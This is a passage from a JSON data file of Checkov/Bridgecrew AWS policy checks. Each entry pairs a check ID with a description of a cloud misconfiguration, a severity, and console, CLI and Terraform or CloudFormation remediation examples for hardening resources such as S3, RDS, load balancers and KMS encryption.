        "description": "AWS Database Migration Service endpoint do not have SSL configured\nDescription\nThis policy identifies Database Migration Service (DMS) endpoints that are not configured with SSL to encrypt connections for source and target endpoints. It is recommended to use SSL connection for source and target endpoints; enforcing SSL connections help protect against 'man in the middle' attacks by encrypting the data stream between endpoint connections.\\n\\nNOTE: Not all databases use SSL in the same way. An Amazon Redshift endpoint already uses an SSL connection and does not require an SSL connection set up by AWS DMS. So there are some exlcusions included in policy RQL to report only those endpoints which can be configured using DMS SSL feature. \\n\\nFor more details:\\nhttps://docs.aws.amazon.com/dms/latest/userguide/CHAP_Security.html#CHAP_Security.SSL\nFix - Buildtime\nTerraform\nGoresource \"aws_dms_endpoint\" \"pass_source_1\" {\n  certificate_arn             = \"arn:aws:acm:us-east-1:123456789012:certificate/12345678-1234-1234-1234-123456789012\"\n  database_name               = \"test\"\n  endpoint_id                 = \"test-dms-endpoint-tf\"\n  endpoint_type               = \"source\"\n  engine_name                 = \"aurora\"\n  extra_connection_attributes = \"\"\n  kms_key_arn                 = \"arn:aws:kms:us-east-1:123456789012:key/12345678-1234-1234-1234-123456789012\"\n  password                    = \"test\"\n  port                        = 3306\n  server_name                 = \"test\"\n  ssl_mode                    = \"require\"\n  username = \"test\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_AWS_18": {
        "url": "https://docs.bridgecrew.io/docs/s3_13-enable-logging",
        "description": "AWS access logging is not enabled on S3 buckets\nDescription\nAccess logging provides detailed audit logging for all objects and folders in an S3 bucket. \nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLo gin to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon S3 console.\nNavigate to the Bucket name list.\nTo enable server access logging for a bucket, select the name of the bucket.\nClick Properties.\nClick Server access logging.\nClick Enable Logging. \n\n\ud83d\udcd8Notes\nFor the target, select the name of the bucket that you want to receive the log record objects. \nThe target bucket must be in the same Region as the source bucket and must not have a default retention period configuration. \n\n\nClick Save.\n\nCLI Command\nThe example below sets the logging policy for MyBucket.\nThe AWS user [email\u00a0protected] will have full control over the log files, no one else has any access. \nS3 logging### First, grant S3 permission with put-bucket-acl:\naws s3api put-bucket-acl --bucket MyBucket --grant-write URI=http://acs.amazonaws.com/groups/s3/LogDelivery --grant-read-acp URI=http://acs.amazonaws.com/groups/s3/LogDelivery\n    \n### Then apply the logging policy:\naws s3api put-bucket-logging --bucket MyBucket --bucket-logging-status file://logging.json\n\n### logging.json is a JSON document in the current folder that contains the logging policy:\n{\n  \"LoggingEnabled\": {\n    \"TargetBucket\": \"MyBucket\",\n    \"TargetPrefix\": \"MyBucketLogs/\",\n    \"TargetGrants\": [\n      {\n        \"Grantee\": {\n          \"Type\": \"AmazonCustomerByEmail\",\n          \"EmailAddress\": \"[email\u00a0protected]\"\n        },\n        \"Permission\": \"FULL_CONTROL\"\n      }\n    ]\n  }\n}\n\nFix - Buildtime \nTerraform\n\nResource: aws_s3_bucket\nArgument: logging. This example uses a dynamic block to enable the feature, the purpose here is to be able to add or not logging details by making a list of 0 or more entries.\n\naws_s3_bucket.bucket.tfresource \"aws_s3_bucket\" \"bucket\" {\n  acl    = var.s3_bucket_acl\n  bucket = var.s3_bucket_name\n  policy = var.s3_bucket_policy\n\n  force_destroy = var.s3_bucket_force_destroy\n  versioning {\n    enabled    = var.versioning\n    mfa_delete = var.mfa_delete\n  }\n\n+  dynamic \"logging\" {\n+    for_each = var.logging\n+    content {\n+      target_bucket = logging.value[\"target_bucket\"]\n+      target_prefix = \"log/${var.s3_bucket_name}\"\n+    }\n+  }\n}\n\nAlternatively you could just always define the logging block:\nGoresource \"aws_s3_bucket\" \"bucket\" {\n  acl    = var.s3_bucket_acl\n  bucket = var.s3_bucket_name\n  policy = var.s3_bucket_policy\n\n  force_destroy = var.s3_bucket_force_destroy\n  versioning {\n    enabled    = var.versioning\n    mfa_delete = var.mfa_delete\n  }\n\n+  logging {\n+      target_bucket = var.target_bucket\n+      target_prefix = \"log/${var.s3_bucket_name}\"\n+   }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_21": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-all-iam-users-are-members-of-at-least-one-iam-group",
        "description": "Not all IAM users are members of at least one IAM group\nDescription\nIt is generally a best practice to assign all IAM users to at least one IAM group. This can help to ensure that each user has the necessary permissions to perform their tasks and responsibilities.\nBy assigning users to groups, you can more easily manage the permissions for those users. For example, if you need to change the permissions for a group of users, you can simply update the group's policy rather than updating the policies for each individual user.\nFix - Buildtime \nTerraform\n\nResource: aws_iam_group_membership, aws_iam_group, aws_iam_user\nArgument: users and group of aws_iam_group_membership\n\nGoresource \"aws_iam_group_membership\" \"ok_group\" {\n  name = \"tf-testing-group-membership\"\n\n  users = [\n    aws_iam_user.user_good.name,\n  ]\n\n  group = aws_iam_group.group.name\n}\n\nresource \"aws_iam_group\" \"group\" {\n  name = \"test-group\"\n}\n\nresource \"aws_iam_user\" \"user_good\" {\n  name = \"test-user\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_238": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-guardduty-detector-is-enabled",
        "description": "AWS GuardDuty detector is enabled\nDescription\nEnabling the AWS GuardDuty detector can help protect your Amazon Web Services (AWS) resources from various types of threats, such as malware, data breaches, and unauthorized access. GuardDuty is a threat detection service that uses machine learning and other techniques to analyze data from various sources (such as VPC Flow Logs, AWS CloudTrail logs, and DNS logs) and identify potential security threats.\nBy ensuring that the GuardDuty detector is enabled, you can take advantage of this service and receive alerts when potential threats are detected. This can help you take timely action to address any security issues and prevent security incidents from occurring.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_guardduty_detector\" \"pass\" {\n  enable = true\n  tags   = { test = \"Fail\" }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_28": {
        "url": "https://docs.bridgecrew.io/docs/ensure-public-facing-alb-are-protected-by-waf",
        "description": "Application Load Balancer (ALB) not configured with AWS Web Application Firewall v2 (AWS WAFv2)\nDescription\n AWS WAF is a web application firewall service that helps protect your web applications from common web exploits that could affect your application's availability, integrity, or confidentiality.\nBy attaching AWS WAF to your public-facing ALBs, you can create rules that block or allow traffic based on the characteristics of the traffic, such as the IP address, the HTTP method, or the values of specific headers. This can help to protect your application from common web exploits such as SQL injection attacks, cross-site scripting attacks, and other types of malicious traffic.\nFix - Buildtime\nTerraform\nGoresource \"aws_lb\" \"lb_good_1\" {\n  internal= false\n}\n\n\nresource \"aws_wafregional_web_acl_association\" \"foo\" {\n  resource_arn = aws_lb.lb_good_1.arn\n  web_acl_id = aws_wafregional_web_acl.foo.id\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_7": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-amazon-emr-clusters-security-groups-are-not-open-to-the-world",
        "description": "Amazon EMR clusters' security groups are open to the world\nDescription\nIt is generally a good security practice to ensure that the security groups for your Amazon EMR clusters are not open to the world, as this means that the clusters are only accessible from within your private network or from certain approved IP addresses or security groups. This can help to protect your EMR clusters from unauthorized access, as external parties will not be able to connect to them over the internet.\nFix - Buildtime \nTerraform\n\nResource: aws_emr_cluster and aws_security_group\nArgument: ingress of aws_security_group\n\nGoresource \"aws_emr_cluster\" \"cluster_ok\" {\n  name          = \"emr-test-arn\"\n  release_label = \"emr-4.6.0\"\n  applications  = [\"Spark\"]\n\n  ec2_attributes {\n    emr_managed_master_security_group = aws_security_group.block_access_ok.id\n    emr_managed_slave_security_group  = aws_security_group.block_access_ok.id\n    instance_profile                  = \"connected_to_aws_iam_instance_profile\"\n  }\n}\n\nresource \"aws_security_group\" \"block_access_ok\" {\n  name        = \"block_access\"\n  description = \"Block all traffic\"\n\n  ingress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"10.0.0.0/16\"]\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"10.0.0.0/16\"]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_103": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_43",
        "description": "AWS Load Balancer is not using TLS 1.2\nDescription\nA listener in an AWS Load Balancer is a process that checks for connection requests. Users can define a listener when creating a load balancer, and add listeners to the load balancer at any time. The HTTPS listener enables traffic encryption between your load balancer and the clients that initiate SSL or TLS sessions.\nFix - Runtime\nAWS Console\n\nGo to the Amazon EC2 console at https://console.aws.amazon.com/ec2/.\nOn the navigation pane, under LOAD BALANCING, select Load Balancers.\nSelect the load balancer and choose Listeners.\n4.Select the check box for the TLS listener and choose Edit.\nFor Security policy, choose a security policy.\n\nCLI Command\nTextmodify-listener\n--listener-arn <value>\n[--port <value>]\n[--protocol <value>]\n[--ssl-policy <value>]\n\nFix - Buildtime\nTerraform\nResource: aws_lb_listener\nAttribute: protocol - (Optional) The protocol for connections from clients to the load balancer. For Application Load Balancers, valid values are HTTP and HTTPS, with a default of HTTP. For Network Load Balancers, valid values are TCP, TLS, UDP, and TCP_UDP. Not valid to use UDP or TCP_UDP if dual-stack mode is enabled. Not valid for Gateway Load Balancers.\naws_db_parameter_group.custom.tfresource \"aws_lb_listener\" \"front_end\" {\n  load_balancer_arn = aws_lb.front_end.arn\n  port              = \"443\"\n  protocol          = \"HTTPS\"\n  + ssl_policy        = \"ELBSecurityPolicy-TLS13-1-2-2021-06\"\n  certificate_arn   = \"arn:aws:acm:eu-west-2:999999999:certificate/77777777-5d4a-457f-8888-02550c8c9244\"\n\n  default_action {\n    type             = \"forward\"\n    target_group_arn = aws_lb_target_group.front_end.arn\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV2_AWS_27": {
        "url": "https://docs.bridgecrew.io/docs/ensure-postgres-rds-has-query-logging-enabled",
        "description": "Ensure Postgres RDS as aws_rds_cluster has Query Logging enabled\nDescription\nThis check ensures that you have enabled query logging set up for your PostgreSQL database cluster. A cluster needs to have a non-default parameter group and two parameters set - that of log_statement and log_min_duration_statement, these need to be set to all and 1 respectively to get sufficient logs.\n Note\nSetting querying logging can expose secrets (including passwords) from your queries, - restrict and encrypt to mitigate. \nFix - Buildtime\nTerraform\nYou will need to have a resource aws_rds_cluster_parameter_group that is referred to your aws_rds_cluster_parameter_group attribute: db_cluster_parameter_group_name. With that in place the following parameters need to be set: \naws_rds_cluster_parameter_group.examplea.tfresource \"aws_rds_cluster_parameter_group\" \"examplea\" {\n  name = \"rds-cluster-pg\"\n  family      = \"aurora5.7\"\n  description = \"RDS default cluster parameter group\"\n\n+  parameter {\n+    name=\"log_statement\"\n+    value=\"all\"\n+  }\n\n+  parameter {\n+    name=\"log_min_duration_statement\"\n+    value=\"1\"\n+  }\n}\n\nFor more details see the aws docs here: https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/USER_LogAccess.Concepts.PostgreSQL.html",
        "severity": "LOW"
    },
    "CKV2_AWS_46": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cloudfromt-distribution-with-s3-have-origin-access-set-to-enabled",
        "description": "AWS Cloudfront Distribution with S3 have Origin Access set to disabled\nDescription\nThis policy identifies the AWS CloudFront distributions which are utilizing S3 bucket and have Origin Access Disabled. The origin access identity feature should be enabled for all your AWS CloudFront CDN distributions in order to restrict any direct access to your objects through Amazon S3 URLs.\nFix - Buidtime\nTerraform\nYAMLresource \"aws_s3_bucket\" \"b\" {\n  bucket = \"mybucket\"\n\n  tags = {\n    Name = \"My bucket\"\n  }\n}\n\nresource \"aws_cloudfront_distribution\" \"pass_1\" {\n\n\n  origin {\n    domain_name = aws_s3_bucket.b.bucket_regional_domain_name\n    origin_id   = \"failoverS3\"\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n\n  }\n\n\n\n\n  enabled             = true\n  is_ipv6_enabled     = true\n  comment             = \"Some comment\"\n  default_root_object = \"index.html\"\n\n  logging_config {\n    include_cookies = false\n    bucket          = \"mylogs.s3.amazonaws.com\"\n    prefix          = \"myprefix\"\n  }\n\n  aliases = [\"mysite.example.com\", \"yoursite.example.com\"]\n\n  default_cache_behavior {\n    allowed_methods  = [\"DELETE\", \"GET\", \"HEAD\", \"OPTIONS\", \"PATCH\", \"POST\", \"PUT\"]\n    cached_methods   = [\"GET\", \"HEAD\"]\n    target_origin_id = local.s3_origin_id\n\n    forwarded_values {\n      query_string = false\n\n      cookies {\n        forward = \"none\"\n      }\n    }\n\n    viewer_protocol_policy = \"allow-all\"\n    min_ttl                = 0\n    default_ttl            = 3600\n    max_ttl                = 86400\n  }\n\n  # Cache behavior with precedence 0\n  ordered_cache_behavior {\n    path_pattern     = \"/content/immutable/*\"\n    allowed_methods  = [\"GET\", \"HEAD\", \"OPTIONS\"]\n    cached_methods   = [\"GET\", \"HEAD\", \"OPTIONS\"]\n    target_origin_id = local.s3_origin_id\n\n    forwarded_values {\n      query_string = false\n      headers      = [\"Origin\"]\n\n      cookies {\n        forward = \"none\"\n      }\n    }\n\n    min_ttl                = 0\n    default_ttl            = 86400\n    max_ttl                = 31536000\n    compress               = true\n    viewer_protocol_policy = \"redirect-to-https\"\n  }\n\n  # Cache behavior with precedence 1\n  ordered_cache_behavior {\n    path_pattern     = \"/content/*\"\n    allowed_methods  = [\"GET\", \"HEAD\", \"OPTIONS\"]\n    cached_methods   = [\"GET\", \"HEAD\"]\n    target_origin_id = local.s3_origin_id\n\n    forwarded_values {\n      query_string = false\n\n      cookies {\n        forward = \"none\"\n      }\n    }\n\n    min_ttl                = 0\n    default_ttl            = 3600\n    max_ttl                = 86400\n    compress               = true\n    viewer_protocol_policy = \"redirect-to-https\"\n  }\n\n  price_class = \"PriceClass_200\"\n\n  restrictions {\n    geo_restriction {\n      restriction_type = \"whitelist\"\n      locations        = [\"US\", \"CA\", \"GB\", \"DE\"]\n    }\n  }\n\n  tags = {\n    Environment = \"production\"\n  }\n\n  viewer_certificate {\n    cloudfront_default_certificate = true\n  }\n  web_acl_id = aws_wafv2_web_acl.example.arn\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_250": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-rds-postgresql-instances-use-a-non-vulnerable-version-of-log_fdw-extension",
        "description": "AWS RDS PostgreSQL exposed to local file read vulnerability\nDescription\nThe log_fdw extension for Amazon Relational Database Service (AWS RDS) PostgreSQL instances allows you to query log files from foreign servers as if they were tables in a database. However, certain versions of the log_fdw extension may contain vulnerabilities that can be exploited by attackers.\nBy ensuring that your AWS RDS PostgreSQL instances use a non-vulnerable version of the log_fdw extension, you can help protect your database from potential security threats. \nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_db_instance\" \"pass\" {\n  name           = \"name\"\n  instance_class = \"db.t3.micro\"\n  engine         = \"postgres\"\n  engine_version = \"13.3\"\n}\n\nresource \"aws_rds_cluster\" \"pass\" {\n  engine = \"aurora-postgresql\"\n  engine_version = \"11.9\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_223": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-ecs-cluster-enables-logging-of-ecs-exec",
        "description": "AWS ECS Cluster does not enable logging of ECS Exec\nDescription\nIt is recommended to have a proper logging process for AWS ECS Cluster in order to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_ecs_cluster\" \"pass2\" {\n  name = \"white-hart\"\n  configuration {\n    execute_command_configuration {\n      # kms_key_id = aws_kms_key.example.arn\n      logging = \"DEFAULT\"\n\n      log_configuration {\n        # cloud_watch_encryption_enabled = true\n        # cloud_watch_log_group_name     = aws_cloudwatch_log_group.example.name\n\n        # or\n        # s3_bucket_name=   and\n        # s3_bucket_encryption_enabled =true\n      }\n    }\n  }\n  tags = { test = \"fail\" }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_262": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-kendra-index-server-side-encryption-uses-customer-managed-keys-cmks-1",
        "description": "AWS Kendra index server side encryption does not use Customer Managed Keys (CMKs)\nDescription\nThis policy identifies Kendra index servers which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Kendra index server data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n Resource: aws_kendra_index\n Arguments: server_side_encryption_configuration.kms_key_id\nGoresource \"aws_kendra_index\" \"pass\" {\n  name     = \"example\"\n  role_arn = aws_iam_role.this.arn\n\n  server_side_encryption_configuration {\n    kms_key_id = data.aws_kms_key.this.arn\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_217": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-api-deployments-enable-create-before-destroy",
        "description": "AWS API deployments do not enable Create before Destroy\nDescription\nIt is recommended to enable create_before_destroy argument inside the resource lifecycle configuration block to avoid possible return errors such as BadRequestException: Active stages pointing to this deployment must be moved or deleted on recreation.\nFix - Buildtime\nCloudFormation\nCloudFormation creates a new deployment first and then will delete the old one automatically.\nTerraform\nGoresource \"aws_api_gateway_deployment\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = \"example\"\n  \n+ lifecycle {\n+   create_before_destroy = true\n+ }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_231": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-3389",
        "description": "AWS NACL allows ingress from 0.0.0.0/0 to port 3389\nDescription\nNetwork Access Control List (NACL) is stateless and provides filtering of ingress/egress network traffic to AWS resources. We recommend that NACLs do not allow unrestricted ingress access to port 3389. Removing unfettered connectivity to remote console services, such as RDP, reduces a server's exposure to risk.\nFix - Buildtime\nCloudFormation\nYAMLResources:  \n  InboundRule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n       NetworkAclId:\n         Ref: MyNACL\n       RuleNumber: 200\n       Protocol: 6\n       RuleAction: allow\n-      CidrBlock: 0.0.0.0/0\n+      CidrBlock: 10.0.0.0/32\n       PortRange:\n         From: 3389\n         To: 3389\n\nTerraform\nGoresource \"aws_network_acl_rule\" \"example\" {\n  network_acl_id = aws_network_acl.example.id\n  rule_number    = 200\n  egress         = false\n  protocol       = \"tcp\"\n  rule_action    = \"allow\"\n- cidr_block     = \"0.0.0.0/0\"\n+ cidr_block     = \"10.0.0.0/32\"\n  from_port      = 3389\n  to_port        = 3389\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_213": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-elb-policy-uses-only-secure-protocols",
        "description": "AWS ELB Policy uses some unsecure protocols\nDescription\nBy ensuring that your AWS ELB policy only uses secure protocols, you can help prevent attackers from intercepting and reading sensitive information that is transmitted between your ELB and its clients. This can help protect your network and data from various types of attacks, including man-in-the-middle attacks, eavesdropping, and other types of data interception.\nFix - Buildtime\nTerraform\nGoresource \"aws_load_balancer_policy\" \"pass\" {\n  load_balancer_name = aws_elb.wu-tang.name\n  policy_name        = \"wu-tang-ssl\"\n  policy_type_name   = \"SSLNegotiationPolicyType\"\n\n  policy_attribute {\n    name  = \"Protocol-TLSv1.2\"\n    value = \"true\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_261": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-kendra-index-server-side-encryption-uses-customer-managed-keys-cmks",
        "description": "AWS HTTP and HTTPS target groups do not define health check\nDescription\nHealth checks ensure that a target is reachable before sending traffic from a load balancer to the endpoint. This is a best practice compared to blindly sending traffic to what can be unhealthy targets.\nFix - Runtime\nThe way you enable health checks varies by the endpoint. If you are using an autoscaling group:\n\nGo to the EC2 console and select Auto Scaling Groups\nSelect the check box next to an existing group\nOn the Details tab, choose Health checks and Edit\nSelect your health check type\nAdd a Health check grace period\nSelect update\n\nOr for the load balancer:\n\nOpen the Amazon EC2 console\nUnder Load Balancing, select Load Balancers\nSelect your load balancer\nOn the Health Check tab, choose Edit Health Check\nOn the Configure Health Check page, configure your health check\nSelect Save\n\nFix - Buildtime\n\nResource: aws_lb_target_group, aws_alb_target_group\nArgument: health_check\n\nGoresource \"aws_alb_target_group\" \"example\" {\n  name = \"target-group-1\"\n  port = 80\n  protocol = \"HTTP\"\n\n+  health_check {\n+    path = \"/api/1/resolve/default?path=/service/my-service\"\n+    ...\n+    matcher = \"200\"  # has to be HTTP 200 or fails\n+  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_225": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-method-settings-enable-caching",
        "description": "AWS API Gateway method settings do not enable caching\nDescription\nEnabling caching for API Gateway helps improve your API's performance by allowing clients to retrieve responses from a cache instead of making a request to the backend service. This can reduce the load on your backend service and improve the overall responsiveness of your API. It can reduce the cost of using your API by reducing the number of requests your backend service needs to handle. It can also improve the reliability of your API by allowing it to continue functioning even if the backend service is unavailable or experiencing problems.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_api_gateway_method_settings\" \"pass\" {\n  rest_api_id = aws_api_gateway_rest_api.fail.id\n  stage_name  = aws_api_gateway_stage.fail.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled      = true\n    metrics_enabled      = false\n    logging_level        = \"INFO\"\n    cache_data_encrypted = true\n    data_trace_enabled   = false\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_6": {
        "url": "https://docs.bridgecrew.io/docs/s3-bucket-should-have-public-access-blocks-defaults-to-false-if-the-public-access-block-is-not-attached",
        "description": "S3 Bucket does not have public access blocks \nDescription\nWhen you create an S3 bucket, it is good practice to set the additional resource  aws_s3_bucket_public_access_block to ensure the bucket is never accidentally public.\nWe recommend you ensure S3 bucket has public access blocks. If the public access block is not attached it defaults to False.\nFix - Buildtime \nTerraform\n\nResource: aws_s3_bucket, aws_s3_bucket_public_access_block\nArgument: bucket and of block_public_acls aws_s3_bucket_public_access_block\n\nGoresource \"aws_s3_bucket\" \"bucket_good_1\" {\n  bucket = \"bucket_good\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"access_good_1\" {\n  bucket = aws_s3_bucket.bucket_good_1.id\n\n  block_public_acls   = true\n  block_public_policy = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_258": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-authtype-for-your-lambda-function-urls-is-defined",
        "description": "AWS Lambda function URLs AuthType is not defined\nDescription\nThe AWS AuthType for your Lambda function URLs determines how users are authenticated when they access the URLs of your Lambda functions. It is important to ensure that the AWS AuthType for your Lambda function URLs is defined because it helps to secure your functions and protect them from unauthorized access.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_lambda_function_url\" \"pass\" {\n  function_name      = aws_lambda_function.test.function_name\n  qualifier          = \"my_alias\"\n  authorization_type = \"AWS_IAM\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_257": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-codecommit-branch-changes-have-at-least-2-approvals",
        "description": "AWS Codecommit branch changes has less than 2 approvals\nDescription\nThe best practice for merging new code into a code base is to have at least two reviewers. AWS CodeCommit can enforce this policy.\nFix - Runtime\n\nIn the AWS console, go to CodeCommit.\nSelect Approval Rule Templates and then Create Template.\nUnder Number of approvals needed, add at least two approvals.\n\nFix - Buildtime\nTerraform\nresource \"aws_codecommit_approval_rule_template\" \"example\" {\n...\n  content = <<EOF\n{\n    \"Version\": \"2018-11-08\",\n    \"DestinationReferences\": [\"refs/heads/master\"],\n    \"Statements\": [{\n        \"Type\": \"Approvers\",\n+        \"NumberOfApprovalsNeeded\": 2,\n        \"ApprovalPoolMembers\": [\"arn:aws:sts::123456789012:assumed-role/CodeCommitReview/*\"]\n    }]\n}\nEOF\n...\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_210": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-batch-job-is-not-defined-as-a-privileged-container",
        "description": "AWS Batch Job is defined as a privileged container\nDescription\nBy defining your AWS Batch job as a privileged container, you can ensure that it has the necessary privileges to access system devices, such as GPUs or hardware accelerators, modify system-level configuration files, and more.\nThat said, making a job overly permissive might increase the potential security risks, as the job will have more access to sensitive system resources\u05e5\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_batch_job_definition\" \"pass\" {\n  name = \"tf_test_batch_job_definition\"\n  type = \"container\"\n\n  container_properties = <<CONTAINER_PROPERTIES\n{\n    \"command\": [\"ls\", \"-la\"],\n    \"image\": \"busybox\",\n    \"memory\": 1024,\n    \"vcpus\": 1,\n    \"privileged\": false,\n    \"volumes\": [\n      {\n        \"host\": {\n          \"sourcePath\": \"/tmp\"\n        },\n        \"name\": \"tmp\"\n      }\n    ],\n    \"environment\": [\n        {\"name\": \"VARNAME\", \"value\": \"VARVAL\"}\n    ],\n    \"mountPoints\": [\n        {\n          \"sourceVolume\": \"tmp\",\n          \"containerPath\": \"/tmp\",\n          \"readOnly\": false\n        }\n    ],\n    \"ulimits\": [\n      {\n        \"hardLimit\": 1024,\n        \"name\": \"nofile\",\n        \"softLimit\": 1024\n      }\n    ]\n}\nCONTAINER_PROPERTIES\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_212": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-ebs-volume-is-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk",
        "description": "AWS EBS Volume is not encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)\nDescription\nThis policy identifies Elastic File Systems (EFSs) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n Resource: aws_ebs_volume\n Arguments: kms_key_id \nGoresource \"aws_ebs_volume\" \"pass\" {\n  availability_zone = data.aws_availability_zones.available.names[0]\n  size              = 1\n  encrypted         = true\n  kms_key_id        = aws_kms_key.test.arn\n\n  tags = {\n    Name = \"taggy\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_254": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-events-are-encrypted-with-a-customer-managed-key-cmk",
        "description": "AWS DLM cross-region events are not encrypted with a Customer Managed Key (CMK)\nDescription\nThis policy identifies DLM cross-region events) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your DLM cross-region events data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n Resource: aws_dlm_lifecycle_policy\n Arguments: action.cross_region_copy.encryption_configuration.cmk_arn\nGoresource \"aws_dlm_lifecycle_policy\" \"pass\" {\n  description        = \"tf-acc-basic\"\n  execution_role_arn = aws_iam_role.example.arn\n\n  policy_details {\n    policy_type = \"EVENT_BASED_POLICY\"\n\n    resource_types = []\n    target_tags    = {}\n\n    action {\n      name = \"tf-acc-basic\"\n      cross_region_copy {\n        encryption_configuration {\n          cmk_arn    = aws_kms_key.test.arn\n          encryption = true\n        }\n        retain_rule {\n          interval      = 15\n          interval_unit = \"MONTHS\"\n        }\n\n      }\n    }\n\n    event_source {\n      type = \"MANAGED_CWE\"\n      parameters {\n        description_regex = \"^.*Created for policy: policy-1234567890abcdef0.*$\"\n        event_type        = \"shareSnapshot\"\n        snapshot_owner    = [data.aws_caller_identity.current.account_id]\n      }\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_219": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-codepipeline-artifactstore-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk",
        "description": "AWS CodePipeline artifactStore is not encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)\nDescription\nThis policy identifies CodePipeline artifactStores which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your CodePipeline artifactStore  data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nResource: aws_codepipeline\nArguments: encryption_key\nTextresource \"aws_codepipeline\" \"pass\" {\n  name     = \"tf-test-pipeline\"\n  role_arn = aws_iam_role.codepipeline_role.arn\n\n  artifact_store {\n    location = aws_s3_bucket.codepipeline_bucket.bucket\n    type     = \"S3\"\n\n    encryption_key {\n      id   = data.aws_kms_alias.s3kmskey.arn\n      type = \"KMS\"\n    }\n  }\n",
        "severity": "LOW"
    },
    "CKV_AWS_253": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-events-are-encrypted",
        "description": "AWS DLM cross-region events are not encrypted\nDescription\nAs a best practice enable encryption for your AWS DLM cross-region events to improve data security without making changes to your business or applications.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_dlm_lifecycle_policy\" \"pass\" {\n  description        = \"tf-acc-basic\"\n  execution_role_arn = aws_iam_role.example.arn\n\n  policy_details {\n    policy_type = \"EVENT_BASED_POLICY\"\n\n    resource_types = []\n    target_tags    = {}\n\n    action {\n      name = \"tf-acc-basic\"\n      cross_region_copy {\n        encryption_configuration {\n          cmk_arn    = aws_kms_key.test.arn\n          encryption = true\n        }\n        retain_rule {\n          interval      = 15\n          interval_unit = \"MONTHS\"\n        }\n\n      }\n    }\n\n    event_source {\n      type = \"MANAGED_CWE\"\n      parameters {\n        description_regex = \"^.*Created for policy: policy-1234567890abcdef0.*$\"\n        event_type        = \"shareSnapshot\"\n        snapshot_owner    = [data.aws_caller_identity.current.account_id]\n      }\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_233": {
